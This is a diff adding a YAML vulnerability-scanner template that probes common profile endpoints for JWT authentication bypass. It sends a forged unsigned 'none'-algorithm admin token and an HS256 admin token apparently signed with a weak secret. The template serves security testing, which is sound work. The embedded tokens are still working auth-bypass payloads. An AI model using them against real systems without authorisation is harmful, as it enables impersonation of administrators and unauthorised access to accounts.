@@ -1,0 +1,58 @@
+id: hunt3r-jwt-manipulation
+
+info:
+  name: JWT Algorithm Confusion & Weak Secret
+  author: hunt3r
+  severity: high
+  description: Detects JWT vulnerabilities including none-algorithm attack, weak secrets, and unsigned tokens.
+  tags: jwt,auth-bypass,token-leak,hunt3r
+  reference:
+    - https://portswigger.net/web-security/jwt
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/user/whoami"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/me"
+
+    headers:
+      Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9fQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "\"id\""
+          - "\"email\""
+          - "\"role\""
+          - "admin"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/user/whoami"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/profile"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0sImlhdCI6MTYwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Unauthorized"
+          - "Invalid token"
+          - "jwt malformed"
